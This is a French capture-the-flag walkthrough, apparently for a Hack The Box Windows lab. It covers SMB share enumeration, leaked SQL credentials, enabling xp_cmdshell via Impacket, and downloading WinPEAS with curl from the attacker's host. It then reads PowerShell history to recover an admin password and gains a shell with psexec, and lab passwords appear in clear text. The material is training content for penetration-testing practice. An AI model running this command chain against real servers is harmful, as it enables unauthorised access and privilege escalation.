
- On trouve un service SMB exposé (port 139 et 445 ouvert).
- On liste les share : `smbclient -L //10.129.191.198/`
- On trouve un fichier de configuration dans le share backup : `smbclient //10.129.191.198/backups`
- Il contient les identifiants d'un compte SQL : ARCHETYPE\sql_svc:M3g4c0rp123

## Impacket mssqlclient
On se connecte à la base de données Microsoft SQL avec le compte trouvé précédemment :
```bash
python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.191.198 -port 1433 -windows-auth
```

## Spawn a cmd shell from MS SQL
En étant connecté au service MS SQL, on exécute la commande suivante pour obtenir un cmd : 
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Use cmd
XP_CMDSHELL 'dir';
```

On peut exécuter des commandes sur le serveur !
Maintenant, on souhaite élever nos privilèges

## Winpeas
Pour élever ces privilèges, on va télécharger winpeas sur le serveur. 
Pour ça :
- On commence par télécharger un .exe de Winpeas localement
- On sert ce fichier avec un serveur python : `python3 -m http.server 8080`
- On fait une requête depuis le serveur (dans le shell dans SQL) pour télécharger le fichier exe (on le télécharge dans un dossier où on a les droits d'écriture) : 
```sql
XP_CMDSHELL 'curl http://10.10.15.97:8080/winPEASx64.exe -o C:\Users\sql_svc\Desktop\winPEAS.exe';
```


On exécute WinPEAS sur le serveur.
Comme il y a beaucoup d'output, on le met dans un fichier pour pouvoir faire des grep.
```SQL
XP_CMDSHELL 'findstr .txt C:\Users\sql_svc\Desktop\output.txt';
-- On affiche le contenu du fichier (consoleHost_history est l'équivalent de bash_history sur linux)
XP_CMDSHELL 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
```

Et hop, on obtient le mot de passe administrateur : `/user:administrator MEGACORP_4dm1n!!`

## Psexec
On se connecte en tant qu'admin avec psexec (script de la suite impacket pou linux) :
```bash
python3 impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.129.191.198
```

Ensuite, on cherche sur le bureau et on trouve le flag !